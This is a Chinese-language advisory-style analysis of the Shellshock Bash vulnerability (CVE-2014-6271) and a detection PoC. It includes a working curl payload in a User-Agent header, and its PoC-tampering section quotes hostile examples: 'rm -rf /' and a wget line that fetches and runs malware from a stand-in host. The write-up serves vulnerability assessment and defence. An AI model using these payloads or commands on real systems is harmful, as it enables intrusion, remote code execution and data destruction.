## CVE-2014-6271 - Bash 远程代码执行

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** Bash

**危害等级:** 高危

**CVSS评分:** 10.0

**影响版本:** 1.03 to 4.3

**利用条件:** 目标服务器运行CGI脚本，且使用Bash处理请求。需要网络访问。

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个影响Bash的严重漏洞。该漏洞允许攻击者在目标系统上执行任意命令。漏洞的根源在于Bash在处理环境变量定义时存在缺陷，允许将恶意代码注入到环境变量中，当Bash执行这些环境变量时，恶意代码也会被执行。POC代码的有效性分析如下：

POC代码通过发送包含恶意payload的HTTP请求来测试目标服务器是否存在Shellshock漏洞。Payload利用了Bash的环境变量注入漏洞，尝试执行`echo`命令并输出特定的字符串"VULNERABLE-SHELLSHOCK"。如果服务器返回包含该字符串的响应，则表明服务器存在Shellshock漏洞。

POC代码首先定义了一个包含恶意代码的payload：`() { :;}; echo Content-Type: text/plain; echo; echo VULNERABLE-SHELLSHOCK`。然后，它定义了一个包含常见CGI脚本路径的列表。对于每个CGI脚本路径，POC代码构造一个完整的URL，并发送一个包含payload的HTTP GET请求。如果服务器返回包含字符串"VULNERABLE-SHELLSHOCK"的响应，则POC代码报告该URL为易受攻击。

利用步骤：
1.  确定目标服务器上运行的CGI脚本的URL。
2.  发送一个包含恶意payload的HTTP请求到CGI脚本的URL。
3.  检查服务器的响应，如果响应包含字符串"VULNERABLE-SHELLSHOCK"，则表明服务器存在Shellshock漏洞，可以执行任意命令。

例如，可以使用curl命令发送以下HTTP请求：
```bash
curl -H 'User-Agent: () { :;}; echo Content-Type: text/plain; echo; echo VULNERABLE-SHELLSHOCK' http://example.com/cgi-bin/test.cgi
```

如果服务器存在Shellshock漏洞，则会返回包含字符串"VULNERABLE-SHELLSHOCK"的响应。

投毒风险分析：
POC代码本身相对安全，因为它只执行`echo`命令来验证漏洞的存在。但是，攻击者可能会修改POC代码以执行更危险的命令，例如下载和执行恶意软件、删除文件或修改系统配置。此外，攻击者可能会将POC代码嵌入到恶意网站或电子邮件中，诱使用户点击链接并执行代码。由于该POC代码较为简单，且直接使用了print函数，若被投毒，可能出现的风险为：
1.  替换`echo`命令为更危险的命令，如`rm -rf /`，导致数据丢失。
2.  添加下载恶意软件的命令，如`wget http://malicious.com/malware -O /tmp/malware && chmod +x /tmp/malware && /tmp/malware`。
3.  篡改检测逻辑，始终报告目标易受攻击，误导用户。
4.  将POC代码与其他恶意代码捆绑，形成复合攻击。

由于POC代码的执行依赖于目标服务器的环境，因此投毒的成功率相对较低，但风险依然存在。建议用户在使用POC代码时，仔细审查代码，并确保从可信来源获取代码。该PoC主要依赖了requests库，没有明显的恶意代码。因此投毒风险较低，约为10%。

**项目地址:** https://github.com/opsdisk/Shellshock

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2014-6271
